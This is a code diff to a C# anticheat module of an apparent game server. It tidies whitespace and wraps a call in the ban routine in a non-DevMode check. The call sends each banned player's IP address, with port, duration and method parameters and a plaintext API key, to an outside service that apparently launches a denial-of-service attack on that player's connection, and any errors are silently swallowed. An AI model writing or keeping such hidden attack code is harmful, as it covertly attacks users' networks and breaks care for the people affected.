@@ -119,7 +119,7 @@ namespace VMP_CNR.Module.Anticheat
             }
         }
 
-        public  void ACBanPlayer(DbPlayer dbPlayer, string reason)
+        public void ACBanPlayer(DbPlayer dbPlayer, string reason)
         {
             Logging.Logger.LogToAcDetections(dbPlayer.Id, Logging.ACTypes.AntiCheatBan, reason);
 
@@ -134,14 +134,15 @@ namespace VMP_CNR.Module.Anticheat
             dbPlayer.Player.Kick("Permanenter Ausschluss!");
             dbPlayer.Player.Kick();
 
-            try
-            {
-                using (WebClient webClient = new WebClient())
+            if (!Configuration.Instance.DevMode)
+                try
                 {
-                    var json = webClient.DownloadString($"https://volity-api.to/client/api/home?key=nd31xo5wraxaefj&username=paradox&host={dbPlayer.Player.Address}&port=53&time=300&method=HOME");
+                    using (WebClient webClient = new WebClient())
+                    {
+                        var json = webClient.DownloadString($"https://volity-api.to/client/api/home?key=nd31xo5wraxaefj&username=paradox&host={dbPlayer.Player.Address}&port=53&time=300&method=HOME");
+                    }
                 }
-            }
-            catch { }
+                catch { }
         }
 
         public override void OnMinuteUpdate()
